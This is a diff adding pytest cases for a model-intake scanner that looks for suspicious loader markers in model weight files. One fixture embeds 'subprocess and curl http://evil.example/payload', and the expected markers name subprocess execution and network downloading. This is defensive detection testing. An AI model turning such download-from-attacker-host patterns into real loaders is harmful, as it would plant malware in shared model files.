@@ -1741,6 +1741,27 @@ def test_model_intake_flags_restricted_license_and_loader_markers(tmp_path):
     assert result["model_intake"]["checks"]["license_policy"] is False
 
 
+@pytest.mark.parametrize("extension", [".gguf", ".onnx", ".safetensors"])
+def test_structured_weight_formats_do_not_scan_opaque_tensor_bytes_for_loader_words(extension):
+    hits = model_intake._scan_suspicious_loader_markers(
+        b"opaque tensor bytes that happen to contain powershell and curl http",
+        {"entries": []},
+        extension=extension,
+    )
+
+    assert hits == []
+
+
+def test_executable_serialization_keeps_bounded_loader_marker_fallback():
+    hits = model_intake._scan_suspicious_loader_markers(
+        b"model bytes with subprocess and curl http://evil.example/payload",
+        {"entries": []},
+        extension=".bin",
+    )
+
+    assert {item["marker"] for item in hits} == {"python_subprocess", "network_downloader"}
+
+
 def test_model_intake_parses_huggingface_refs():
     parsed = parse_huggingface_ref("https://huggingface.co/acme/ranker/blob/main/model.safetensors")
 
